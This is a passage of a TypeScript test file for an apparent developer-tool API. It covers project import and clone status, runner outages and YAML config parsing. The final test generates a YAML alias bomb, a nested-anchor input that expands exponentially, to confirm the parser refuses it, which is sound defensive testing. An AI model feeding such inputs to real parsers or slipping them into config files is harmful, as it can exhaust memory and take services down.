  it('rejects choices that do not exist', async () => {
    fixture('shop', PNPM_APP);
    const project = await imported('shop');
    const res = await adopt(project.id, { choices: { backend: 'bogus' } });
    expect(res.statusCode).toBe(400);
    expect(res.json().message).toContain('backend');
  });
});

describe('GET /api/projects/:id/import-status without the runner', () => {
  it('answers 503 when ptyd is unreachable and the folder cannot tell', async () => {
    const id = 'p-unreachable';
    t.db
      .insert(projects)
      .values({
        id,
        name: 'Away',
        slug: 'away',
        repoUrl: 'https://example.com/a.git',
        defaultBranch: 'main',
        path: path.join(ws, 'away'),
        appType: 'custom',
        description: '',
        techStack: null,
        createdAt: new Date(),
      })
      .run();
    const down = await api('GET', `/api/projects/${id}/import-status`);
    expect(down.statusCode).toBe(503);
    expect(down.json().error).toBe('ptyd_unavailable');
    // a client that is connected but times out is the same answer, not a raw 500
    vi.spyOn(t.ptyd, 'get').mockReturnValue({
      list: () => Promise.reject(new Error('ptyd did not answer list')),
    } as never);
    const timeout = await api('GET', `/api/projects/${id}/import-status`);
    expect(timeout.statusCode).toBe(503);
    expect(timeout.json().error).toBe('ptyd_unavailable');
  });
});

describe('GET /api/projects/:id/import-status', () => {
  let ptydServer: PtydServer;
  beforeEach(async () => {
    ptydServer = new PtydServer({ socketPath: t.config.ptydSocket });
    await ptydServer.listen();
    t.ptyd.start();
    await t.ptyd.waitUntilConnected();
  });
  afterEach(async () => {
    t.ptyd.stop();
    await ptydServer.close();
  });

  /** Creates an import_url project whose clone terminal runs `file args` instead of a network clone. */
  async function importUrl(name: string, replace: (dest: string) => { file: string; args: string[] }) {
    const client = t.ptyd.get();
    const spawn = client.spawn.bind(client);
    vi.spyOn(client, 'spawn').mockImplementation((params) =>
      spawn({ ...params, ...replace(params.args?.at(-1) ?? '') }),
    );
    const res = await api('POST', '/api/projects', {
      name,
      source: 'import_url',
      repoUrl: 'https://example.com/x.git',
    });
    expect(res.statusCode, res.body).toBe(201);
    return res.json() as CreateProjectResponse;
  }
  const status = async (id: string) =>
    (await api('GET', `/api/projects/${id}/import-status`)).json() as ImportStatusResponse;

  it('ready once the clone exited 0 and the folder has a HEAD', async () => {
    const source = fixture('source', STATIC_SITE);
    const { project, terminalId } = await importUrl('Cloned', (dest) => ({
      file: 'git',
      args: ['clone', '--progress', '--', source, dest],
    }));
    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('ready'), {
      timeout: 10_000,
    });
    const s = await status(project.id);
    expect(s).toMatchObject({ status: 'ready', exitCode: 0, terminalId });
    expect(s.tail).toContain('Cloning');
  });

  it("once cloned, the default branch is the clone's checked-out branch (runs merge into it)", async () => {
    const source = fixture('source', STATIC_SITE, { branch: 'trunk' });
    const { project } = await importUrl('Cloned Trunk', (dest) => ({
      file: 'git',
      args: ['clone', '--progress', '--', source, dest],
    }));
    expect(project.defaultBranch).toBe('main');
    expect(readProjectSettings(t.db, project.id).importSource).toBe('url');
    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('ready'), {
      timeout: 10_000,
    });
    expect(t.db.select().from(projects).where(eq(projects.id, project.id)).get()?.defaultBranch).toBe(
      'trunk',
    );
  });

  it('failed with the exit code and the tail when the clone fails', async () => {
    const { project } = await importUrl('Broken', (dest) => ({
      file: 'git',
      args: ['clone', '--', path.join(ws, 'does-not-exist'), dest],
    }));
    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('failed'), {
      timeout: 10_000,
    });
    const s = await status(project.id);
    expect(s.exitCode).toBe(128);
    expect(s.tail).toMatch(/fatal/);
  });

  it('cloning while the terminal runs; detect and adopt wait for it', async () => {
    const { project } = await importUrl('Slow', (dest) => ({
      file: 'sh',
      args: ['-c', 'mkdir -p "$1" && echo Cloning && sleep 3', 'sh', dest],
    }));
    expect((await status(project.id)).status).toBe('cloning');
    await vi.waitFor(() => expect(existsSync(project.path)).toBe(true));
    const detecting = await api('GET', `/api/projects/${project.id}/detect`);
    expect(detecting.statusCode).toBe(409);
    expect(detecting.json().message).toMatch(/still being cloned/);
    expect((await adopt(project.id, { write: ['claudeMd'] })).statusCode).toBe(409);
    expect(existsSync(path.join(project.path, 'CLAUDE.md'))).toBe(false);
  });

  it('a project without a clone terminal is ready when it has a HEAD', async () => {
    fixture('shop', PNPM_APP);
    const project = await imported('shop');
    expect(await status(project.id)).toMatchObject({ status: 'ready', exitCode: null, terminalId: null });
  });
});

describe('parseWorktreeYml', () => {
  it('reports YAML and schema errors and refuses alias bombs', async () => {
    const { parseWorktreeYml } = await import('./worktree-config/load.js');
    expect(parseWorktreeYml(OWN_WORKTREE_YML)).toMatchObject({
      ok: true,
      config: { setup: ['make deps'], checks: { build: 'make' } },
    });
    expect(parseWorktreeYml('version: [1')).toMatchObject({ ok: false });
    const schema = parseWorktreeYml('version: 1\nextra: true\n');
    expect(schema.ok).toBe(false);
    const levels = ['a: &a ["x","x","x","x","x","x","x","x","x"]'];
    for (let i = 1; i < 10; i++)
      levels.push(
        `${String.fromCharCode(97 + i)}: &${String.fromCharCode(97 + i)} [${Array(9)
          .fill(`*${String.fromCharCode(96 + i)}`)
          .join(',')}]`,
      );
    const bomb = parseWorktreeYml(`${levels.join('\n')}\nversion: 1\n`);
    expect(bomb.ok).toBe(false);
    // refused while expanding, before the schema sees the extra keys
    expect(bomb.ok ? [] : bomb.errors).toEqual([expect.stringMatching(/alias/i)]);
  });
});
